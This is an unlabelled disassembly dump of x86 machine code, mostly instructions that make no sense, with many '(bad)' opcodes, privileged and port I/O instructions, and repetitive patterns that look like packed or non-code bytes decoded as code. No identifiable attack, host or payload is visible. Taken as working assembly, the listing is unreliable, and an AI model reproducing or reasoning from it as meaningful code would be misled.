  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
